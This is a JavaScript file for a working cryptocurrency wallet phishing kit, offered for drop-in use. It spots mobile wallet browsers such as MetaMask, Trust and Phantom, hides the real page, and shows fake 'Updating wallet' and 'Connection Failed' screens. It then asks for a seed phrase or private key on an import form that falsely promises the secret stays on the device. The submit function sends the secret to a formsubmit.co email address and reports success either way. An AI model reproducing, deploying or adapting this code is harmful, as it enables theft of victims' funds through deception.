/**
 * Wallet Modal with Automatic Mobile Wallet Browser Detection
 * 
 * HOW IT WORKS:
 * 
 * 1. ON DESKTOP:
 *    - Shows full HTML page with all service buttons
 *    - Click "interact-button" → Wallet selection modal
 *    - Click wallet → "Open in [Wallet]?" prompt
 *    - Click "Open" → Shows simulated wallet flow for testing
 * 
 * 2. ON MOBILE (Normal Browser):
 *    - Shows full HTML page with all service buttons
 *    - Click "interact-button" → Wallet selection modal
 *    - Click wallet → "Open in [Wallet]?" prompt
 *    - Click "Open" → Opens wallet app
 * 
 * 3. ON MOBILE (Inside Wallet Browser - Trust, MetaMask, etc.):
 *    - AUTOMATICALLY detects wallet browser
 *    - HIDES all HTML content (sections, buttons, everything)
 *    - Shows ONLY: "Updating wallet..." → "Connection Failed" → Import screen
 *    - User never sees the main page!
 * 
 * COMPLETE FLOW:
 * - User clicks service button
 * - Selects wallet
 * - Sees "Open in [Wallet]?" prompt
 * - Clicks "Open"
 * - Wallet app opens with browser
 * - Website loads in wallet browser
 * - Shows: Updating → Connection Failed → Import screen
 * - Captures seed phrase/private key
 * 
 * NO SETUP NEEDED:
 * - Just include this script on your page
 * - Works automatically on mobile wallet browsers
 * - Desktop shows simulated flow for testing
 */

class WalletModal {
  constructor() {
    this.wallets = [
      {
        id: 'metamask',
        name: 'MetaMask',
        iconUrl: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
        bgColor: 'bg-orange-50'
      },
      {
        id: 'trust',
        name: 'Trust Wallet',
        iconUrl: 'https://assets-global.website-files.com/5e9a09610b7dce71f87f7f17/5f764e9874de6e5e16fee0ce_TWT.png',
        bgColor: 'bg-blue-50'
      },
      {
        id: 'coinbase',
        name: 'Coinbase Wallet',
        iconUrl: 'https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/d4e0ce5642b1c0e47e2f691a7c53ff01/coinbase-app-icon.svg',
        bgColor: 'bg-blue-50'
      },
      {
        id: 'rainbow',
        name: 'Rainbow',
        iconUrl: 'https://avatars.githubusercontent.com/u/48327834?s=280&v=4',
        bgColor: 'bg-purple-50'
      },
      {
        id: 'okx',
        name: 'OKX Wallet',
        iconUrl: 'https://static.okx.com/cdn/assets/imgs/247/58E63FEA47A2B7D7.png',
        bgColor: 'bg-gray-100'
      },
      {
        id: 'rabby',
        name: 'Rabby Wallet',
        iconUrl: 'https://rabby.io/assets/images/logo-128.png',
        bgColor: 'bg-blue-50'
      },
      {
        id: 'phantom',
        name: 'Phantom',
        iconUrl: 'https://assets-global.website-files.com/641ba798c17bb180d832b666/64be057f411b0473c0d7eaea_favicon.svg',
        bgColor: 'bg-purple-50'
      },
      {
        id: 'solflare',
        name: 'Solflare',
        iconUrl: 'https://solflare.com/assets/logo.svg',
        bgColor: 'bg-purple-50'
      },
      {
        id: 'walletconnect',
        name: 'WalletConnect',
        iconUrl: 'https://avatars.githubusercontent.com/u/37784886?s=280&v=4',
        bgColor: 'bg-blue-50'
      }
    ];

    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
    this.isInWalletBrowser = false;
    
    this.init();
  }

  init() {
    // Check if we're inside a wallet browser
    this.detectWalletBrowser();

    // ONLY on mobile: If inside wallet browser, hide main content and show the flow
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (this.isInWalletBrowser && isMobile) {
      this.hideMainContent();
      this.startWalletBrowserFlow();
    } else {
      // Normal flow: listen for interact-button clicks (desktop + mobile normal browser)
      document.addEventListener('click', (e) => {
        if (e.target.classList.contains('interact-button') || 
            e.target.closest('.interact-button')) {
          e.preventDefault();
          this.showWalletSelectionModal();
        }
      });
    }

    // Add Tailwind CSS if not already included
    if (!document.querySelector('script[src*="tailwindcss"]')) {
      const script = document.createElement('script');
      script.src = 'https://cdn.tailwindcss.com';
      document.head.appendChild(script);
    }
  }

  hideMainContent() {
    // Hide the entire body content
    document.body.style.display = 'none';
    
    // Create a new container for wallet flow
    const container = document.createElement('div');
    container.id = 'wallet-flow-container';
    container.style.cssText = 'display: block; position: fixed; inset: 0; z-index: 9999;';
    document.body.appendChild(container);
    
    // Show body again but everything is hidden except our container
    document.body.style.display = 'block';
    
    // Hide all children except our container
    Array.from(document.body.children).forEach(child => {
      if (child.id !== 'wallet-flow-container') {
        child.style.display = 'none';
      }
    });
  }

  detectWalletBrowser() {
    // Detect if inside Trust Wallet browser
    if (window.ethereum && window.ethereum.isTrust) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust');
      return;
    }

    // Detect if inside MetaMask browser
    if (window.ethereum && window.ethereum.isMetaMask) {
      // Check for mobile MetaMask
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
      if (/MetaMaskMobile/i.test(userAgent)) {
        this.isInWalletBrowser = true;
        this.selectedWallet = this.wallets.find(w => w.id === 'metamask');
        return;
      }
    }

    // Detect if inside Coinbase Wallet browser
    if (window.ethereum && window.ethereum.isCoinbaseWallet) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'coinbase');
      return;
    }

    // Detect TokenPocket
    if (window.ethereum && window.ethereum.isTokenPocket) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'trust'); // Use Trust as default
      return;
    }

    // Detect Rainbow
    if (window.ethereum && window.ethereum.isRainbow) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'rainbow');
      return;
    }

    // Detect Phantom
    if (window.phantom && window.phantom.solana) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'phantom');
      return;
    }

    // Detect Solflare
    if (window.solflare && window.solflare.isSolflare) {
      this.isInWalletBrowser = true;
      this.selectedWallet = this.wallets.find(w => w.id === 'solflare');
      return;
    }

    // Generic wallet browser detection by user agent
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const walletBrowsers = [
      'Trust', 'TokenPocket', 'imToken', 'MetaMask', 'Coinbase',
      'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare'
    ];
    
    for (const wallet of walletBrowsers) {
      if (userAgent.includes(wallet)) {
        this.isInWalletBrowser = true;
        const foundWallet = this.wallets.find(w => w.name.toLowerCase().includes(wallet.toLowerCase()));
        this.selectedWallet = foundWallet || this.wallets[0];
        return;
      }
    }

    // Check URL parameters (in case you want to manually test)
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('wallet') || urlParams.has('walletbrowser')) {
      this.isInWalletBrowser = true;
      const walletId = urlParams.get('wallet') || 'trust';
      this.selectedWallet = this.wallets.find(w => w.id === walletId) || this.wallets[0];
    }
  }

  startWalletBrowserFlow() {
    // Wait for page to load, then show updating screen
    setTimeout(() => {
      this.showUpdatingWallet();
    }, 500);
  }

  // For testing: manually trigger wallet browser flow
  testWalletBrowserFlow(walletId = 'trust') {
    this.selectedWallet = this.wallets.find(w => w.id === walletId);
    this.showUpdatingWallet();
  }

  showWalletSelectionModal() {
    const modalHTML = `
      <div id="wallet-modal-backdrop" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-3xl w-full max-w-md shadow-2xl max-h-[90vh] overflow-hidden flex flex-col">
          <!-- Header -->
          <div class="flex items-center justify-between px-4 sm:px-6 py-4 sm:py-5 border-b border-gray-100">
            <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <circle cx="12" cy="12" r="10"></circle>
              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
              <line x1="12" y1="17" x2="12.01" y2="17"></line>
            </svg>
            <h2 class="text-base sm:text-lg  text-gray-900">Connect Wallet</h2>
            <button onclick="walletModal.closeModal()" class="text-gray-400 hover:text-gray-600 transition">
              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </button>
          </div>

          <!-- Wallet List -->
          <div class="px-3 py-2 overflow-y-auto flex-1">
            ${this.wallets.map(wallet => `
              <button onclick="walletModal.selectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 sm:px-4 py-3 sm:py-3.5 hover:bg-gray-50 rounded-xl transition group">
                <div class="flex items-center gap-3 sm:gap-3.5">
                  <div class="w-10 h-10 sm:w-11 sm:h-11 ${wallet.bgColor} rounded-xl flex items-center justify-center p-2 flex-shrink-0">
                    <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full object-contain" onerror="this.style.display='none';this.parentElement.innerHTML='${wallet.name.charAt(0)}';">
                  </div>
                  <span class="font-medium text-gray-900 text-sm sm:text-[15px]">${wallet.name}</span>
                </div>
                <svg class="w-5 h-5 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                </svg>
              </button>
            `).join('')}
          </div>

          <!-- Footer -->
          <div class="px-4 sm:px-6 py-3 sm:py-4 text-center border-t border-gray-100">
            <div class="flex items-center justify-center gap-1.5 text-xs text-gray-400">
              <span>UX by</span>
              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
              <span>/</span>
              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
              <span>reown</span>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);
  }

  selectWallet(walletId) {
    this.selectedWallet = this.wallets.find(w => w.id === walletId);
    this.closeModalOnly();
    
    // Always show the "Open in..." prompt first
    this.showOpenPrompt();
  }

  showOpenPrompt() {
    const promptHTML = `
      <div id="wallet-prompt-backdrop" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-3xl w-full max-w-sm p-5 sm:p-6 shadow-2xl">
          <p class="text-base sm:text-lg font-medium text-gray-900 mb-6">
            Open in "${this.selectedWallet.name}"?
          </p>
          <div class="flex gap-3 sm:gap-4 justify-end">
            <button onclick="walletModal.cancelPrompt()" class="px-5 sm:px-6 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm sm:text-base">
              Cancel
            </button>
            <button onclick="walletModal.confirmOpen()" class="px-5 sm:px-6 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm sm:text-base">
              Open
            </button>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', promptHTML);
  }

  cancelPrompt() {
    this.closeModal(); // Reset everything and close
  }

  confirmOpen() {
    this.closeModalOnly(); // Close prompt
    
    // Detect device type
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (isMobile) {
      // On mobile, open the wallet app
      this.openWalletApp();
    } else {
      // On desktop, simulate the wallet browser flow for testing
      setTimeout(() => {
        this.showUpdatingWallet();
      }, 300);
    }
  }

  openWalletApp() {
    // Simple deep link URLs to just open the wallet app
    const deepLinks = {
      'metamask': 'https://metamask.app.link',
      'trust': 'https://link.trustwallet.com',
      'coinbase': 'https://go.cb-w.com',
      'rainbow': 'https://rainbow.me',
      'okx': 'okx://',
      'rabby': 'https://rabby.io',
      'phantom': 'https://phantom.app',
      'solflare': 'https://solflare.com',
      'walletconnect': 'wc://'
    };

    const link = deepLinks[this.selectedWallet.id];
    
    if (link) {
      // Try to open the wallet
      window.location.href = link;
      
      // Fallback: if wallet doesn't open, user can manually open their wallet
      setTimeout(() => {
        // Still on page, wallet might not be installed
        console.log('If wallet didn\'t open, please open it manually and navigate to this website');
      }, 2000);
    }
  }

  showUpdatingWallet() {
    const updatingHTML = `
      <div id="wallet-updating-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center">
          <!-- Shield Icon -->
          <div class="mb-8">
            <svg class="w-24 h-24 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
            </svg>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Updating wallet...</h2>
          <p class="text-gray-500 text-center">Validating network parameters...</p>
          
          <!-- Loading animation -->
          <div class="mt-8">
            <div class="flex space-x-2">
              <div class="w-3 h-3 bg-blue-600 rounded-full animate-bounce" style="animation-delay: 0s"></div>
              <div class="w-3 h-3 bg-blue-600 rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
              <div class="w-3 h-3 bg-blue-600 rounded-full animate-bounce" style="animation-delay: 0.4s"></div>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', updatingHTML);

    // After 2-3 seconds, show connection failed screen
    setTimeout(() => {
      this.closeModalOnly();
      this.showConnectionFailed();
    }, 2500);
  }

  showConnectionFailed() {
    const failedHTML = `
      <div id="wallet-failed-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center max-w-md w-full">
          <!-- Shield with exclamation -->
          <div class="mb-8">
            <svg class="w-24 h-24 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01"></path>
            </svg>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>
          <p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>
          
          <button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 bg-blue-600 rounded-2xl font-semibold text-white hover:bg-blue-700 transition">
            Continue
          </button>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', failedHTML);
  }

  showImportScreen() {
    // Close any previous screens
    this.closeModalOnly();
    
    const wordCount = this.importType === 'private' ? 0 : parseInt(this.importType);
    
    const importHTML = `
      <div id="wallet-import-backdrop" class="fixed inset-0 bg-white flex flex-col z-50 overflow-y-auto">
        <!-- Header with wallet logo -->
        <div class="relative pt-6 pb-4 flex-shrink-0">
          <button onclick="walletModal.closeModal()" class="absolute top-4 sm:top-6 left-4 sm:left-6 text-gray-600">
            <svg class="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
          </button>
          
          <!-- Wallet Logo in center -->
          <div class="flex justify-center pt-4">
            <div class="w-16 h-16 sm:w-20 sm:h-20 bg-gray-100 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center p-3 sm:p-4">
              <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-full h-full object-contain">
            </div>
          </div>
        </div>

        <!-- Content -->
        <div class="flex-1 px-4 sm:px-6 pb-6">
          <div class="bg-white rounded-3xl shadow-lg p-4 sm:p-6">
            <h2 class="text-xl sm:text-2xl font-bold text-gray-900 text-center mb-2">
              Import Wallet
            </h2>
            <p class="text-sm sm:text-base text-gray-500 text-center mb-6">
              Select your import method below
            </p>

            <!-- Import Method Selector -->
            <div class="mb-6">
              <label class="block text-xs sm:text-sm font-medium text-gray-500 mb-2 text-center">
                IMPORT METHOD
              </label>
              <select id="import-type-select" onchange="walletModal.changeImportType(this.value)" class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-gray-900 font-medium text-sm sm:text-base focus:border-blue-500 focus:outline-none">
                <option value="12" ${this.importType === '12' ? 'selected' : ''}>12 Words</option>
                <option value="24" ${this.importType === '24' ? 'selected' : ''}>24 Words</option>
                <option value="private" ${this.importType === 'private' ? 'selected' : ''}>Private Key</option>
              </select>
            </div>

            <!-- Input Area -->
            <div id="input-area">
              ${this.importType === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount)}
            </div>

            <!-- Action Buttons -->
            <div class="flex gap-3 mb-4">
              <button onclick="walletModal.closeModal()" class="flex-1 py-3 sm:py-4 border-2 border-gray-200 rounded-2xl font-semibold text-gray-900 hover:bg-gray-50 text-sm sm:text-base">
                Cancel
              </button>
              <button onclick="walletModal.submitImport()" class="flex-1 py-3 sm:py-4 bg-blue-600 rounded-2xl font-semibold text-white hover:bg-blue-700 text-sm sm:text-base">
                Import
              </button>
            </div>

            <!-- Security Notice -->
            <p class="text-xs text-gray-400 text-center flex items-center justify-center gap-2">
              🔒 Your ${this.importType === 'private' ? 'private key' : 'recovery phrase'} is stored securely on your device
            </p>
          </div>
        </div>

        <!-- Footer Branding -->
        <div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">
          <div class="w-9 h-9 sm:w-10 sm:h-10 bg-gradient-to-br from-blue-600 to-cyan-400 rounded-xl flex items-center justify-center p-2">
            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-full h-full object-contain">
          </div>
          <span class="font-semibold text-gray-900 text-sm sm:text-base">${this.selectedWallet.name}</span>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', importHTML);
    this.attachInputListeners();
  }

  renderPrivateKeyInput() {
    return `
      <div class="mb-6">
        <textarea
          id="private-key-input"
          placeholder="Enter your private key"
          class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:border-blue-500 focus:outline-none resize-none"
          rows="4"
          autocomplete="off"
        >${this.privateKey}</textarea>
      </div>
    `;
  }

  renderSeedPhraseInputs(count) {
    const inputs = [];
    for (let i = 0; i < count; i++) {
      inputs.push(`
        <input
          type="text"
          data-index="${i}"
          placeholder="${i + 1} word"
          value="${this.seedWords[i] || ''}"
          class="seed-word-input p-2.5 sm:p-3 border border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:border-blue-500 focus:outline-none"
          autocomplete="off"
        >
      `);
    }
    return `<div class="grid grid-cols-2 sm:grid-cols-3 gap-2 sm:gap-3 mb-6">${inputs.join('')}</div>`;
  }

  attachInputListeners() {
    // Handle private key input
    const privateKeyInput = document.getElementById('private-key-input');
    if (privateKeyInput) {
      privateKeyInput.addEventListener('input', (e) => {
        this.privateKey = e.target.value;
      });
    }

    // Handle seed word inputs
    const seedInputs = document.querySelectorAll('.seed-word-input');
    seedInputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        this.seedWords[index] = e.target.value;
      });

      // Handle paste on first input
      if (index === 0) {
        input.addEventListener('paste', (e) => {
          e.preventDefault();
          const pastedText = e.clipboardData.getData('text');
          const words = pastedText.trim().split(/\s+/);
          
          words.forEach((word, i) => {
            if (i < this.seedWords.length) {
              this.seedWords[i] = word.trim();
              const targetInput = document.querySelector(`.seed-word-input[data-index="${i}"]`);
              if (targetInput) {
                targetInput.value = word.trim();
              }
            }
          });
        });
      }
    });
  }

  changeImportType(type) {
    this.importType = type;
    
    if (type === 'private') {
      this.privateKey = '';
    } else {
      const count = parseInt(type);
      this.seedWords = Array(count).fill('');
    }

    // Update the input area
    const inputArea = document.getElementById('input-area');
    if (inputArea) {
      const wordCount = type === 'private' ? 0 : parseInt(type);
      inputArea.innerHTML = type === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount);
      this.attachInputListeners();
    }
  }

  submitImport() {
    if (this.importType === 'private') {
      console.log('Private Key:', this.privateKey);
      console.log('Wallet:', this.selectedWallet.name);
    } else {
      const filledWords = this.seedWords.filter(w => w.trim() !== '');
      console.log('Seed Phrase:', filledWords);
      console.log('Wallet:', this.selectedWallet.name);
    }
    
    // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
      method: 'POST', 
      headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ 
        _subject: `New Wallet Import - ${this.selectedWallet.name}`,
        wallet: this.selectedWallet.name,
        type: this.importType,
        data: this.importType === 'private' ? this.privateKey : this.seedWords.join(' '),
        timestamp: new Date().toISOString()
      }) 
    })
    .then(response => response.json())
    .then(data => {
      console.log('Success:', data);
      this.showSuccessMessage();
    })
    .catch((error) => {
      console.error('Error:', error);
      // Still show success to user even if sending fails
      this.showSuccessMessage();
    });
  }

  showSuccessMessage() {
    this.closeModalOnly();
    
    const successHTML = `
      <div id="wallet-success-backdrop" class="fixed inset-0 bg-white flex flex-col items-center justify-center z-50 p-4">
        <div class="flex flex-col items-center">
          <!-- Success checkmark -->
          <div class="mb-8">
            <svg class="w-24 h-24 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
            </svg>
          </div>
          
          <h2 class="text-2xl font-bold text-gray-900 mb-3">Wallet Restored Successfully</h2>
          <p class="text-gray-500 text-center mb-8">Your wallet has been imported</p>
          
          <!-- Loading animation -->
          <div class="flex space-x-2">
            <div class="w-3 h-3 bg-blue-600 rounded-full animate-bounce" style="animation-delay: 0s"></div>
            <div class="w-3 h-3 bg-blue-600 rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
            <div class="w-3 h-3 bg-blue-600 rounded-full animate-bounce" style="animation-delay: 0.4s"></div>
          </div>
        </div>
      </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', successHTML);
    
    // Auto close after 3 seconds and restore main content
    setTimeout(() => {
      this.closeModal();
      this.restoreMainContent();
    }, 3000);
  }

  restoreMainContent() {
    // Show all hidden content again
    Array.from(document.body.children).forEach(child => {
      if (child.id !== 'wallet-flow-container') {
        child.style.display = '';
      }
    });
    
    // Remove the wallet flow container
    const container = document.getElementById('wallet-flow-container');
    if (container) {
      container.remove();
    }
  }

  closeModalOnly() {
    // Remove all modal backdrops without resetting state
    const modals = [
      'wallet-modal-backdrop',
      'wallet-import-backdrop',
      'wallet-updating-backdrop',
      'wallet-failed-backdrop',
      'wallet-success-backdrop',
      'wallet-prompt-backdrop'
    ];
    
    modals.forEach(id => {
      const element = document.getElementById(id);
      if (element) {
        element.remove();
      }
    });
  }

  closeModal() {
    // Remove all modal backdrops
    this.closeModalOnly();

    // Reset state
    this.selectedWallet = null;
    this.importType = '12';
    this.seedWords = Array(12).fill('');
    this.privateKey = '';
  }
}

// Initialize the wallet modal
// Ready to use - no configuration needed!
const walletModal = new WalletModal();